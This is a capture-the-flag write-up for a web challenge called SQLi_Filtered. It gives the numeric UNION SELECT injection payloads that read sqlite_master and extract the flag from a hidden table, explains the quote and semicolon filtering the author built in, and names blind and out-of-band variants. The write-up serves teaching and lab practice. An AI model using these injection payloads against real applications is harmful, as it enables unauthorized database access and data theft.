# SQLi_Filtered – Personalised Write‑up

**Category:** Web – 150 pts
**Flag:** `flag{sqli_filtered}`

---

## Challenge Flow

1. The application only has a single point of GET /lookup?uid=<value>
2. Using `?uid=1` returns `User name: alice`, confirming there is a `users` table
3. By using all types of regex and the basic tests you see that the code blocks the quotes and semicolons, meaning that it must be Numeric SQL, this means the payload must be something like /lookup?uid=0 UNION SELECT 1-- without quotes and semicolons
4. using /lookup?uid=0 UNION SELECT sql FROM sqlite_master--, I can reveal that there is a table called very_secret
5. From here I can find the flag using /lookup?uid=0 UNION SELECT flag FROM very_secret--
6. This reveals the flag of flag{sqli_filtered}


---


## How Difficulty Was Increased and Defence Mechanisms

I increased the difficulty by prohibiting the use of '," and ; through using a numeric solution when the normally, the solutions are string-based. I further used Generic error messages that would force blind experimentation instead of having the given error messages. I also recompiled the regex after each request to make a new compilation that would slightly obfuscates the code path. I implemented Quote and Semicolon to block ' OR 1=1-- and other similar classic solves. 


---

## Related & Future Variants
- Blind‑SQLi via time‑based or Boolean‑based techniques when direct feedback is suppressed
- Second‑Order SQLi where inputs are stored in one context and later executed in a different query
- Out‑of‑band SQLi leveraging DNS/HTTP exfiltration to leak data when in‑band channels are filtered

---

### Sources

* **PentesterLab – SQL Injection** https://pentesterlab.com
* **PayloadsAllTheThings – SQLi** https://github.com/swisskyrepo/PayloadsAllTheThings
* **SQLite Docs** https://www.sqlite.org/lang_select.html
